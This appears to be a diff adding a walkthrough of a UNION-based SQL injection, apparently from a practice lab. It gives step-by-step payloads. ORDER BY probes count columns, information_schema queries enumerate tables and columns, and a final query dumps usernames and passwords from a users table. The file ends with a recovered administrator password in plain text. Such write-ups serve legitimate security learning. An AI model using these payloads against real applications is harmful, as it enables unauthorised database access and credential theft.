@@ -1,0 +1,24 @@
+1# First of all check how many column are present in the select statement.
+
+2# Two ways to check columns in backend server.
+
+1' or 1=1 order by 1--  [Note the space after the double dash, without space it not comment the rest of the past in MySQL as we know.]
+
+1' or 1=1 order by 1#   (don't forget to encode the string in url form)
+
+3# After finding the number of the columns in the database. Let's use UNION ATTACK to list the tables that exist in the database.
+
+1' union SELECT table_name,null FROM information_schema.tables
+
+4# After finding the tables. Let's go through each and every table from the database or pick the best one which u think that contain username or passwords for all users like i picked i.e 'users_zmaqnh'
+
+1' union SELECT column_name,null FROM information_schema.columns--  [this list all the columns from all tables in information schema]
+
+1' union select column_name,null from information_schema.columns where table_name = 'users_zmaqnh' [this will show you all the columns in the 'users_zmaqnh' table.]
+
+
+5# Finally we found the correct table which is 'users_zmaqnh'. And now we have to dump username and password from this table.
+
+1' union select username_pdnupx,password_vuvjaq from users_zmaqnh --
+
+# administrator password is gjn81bokhipc27zbmekf
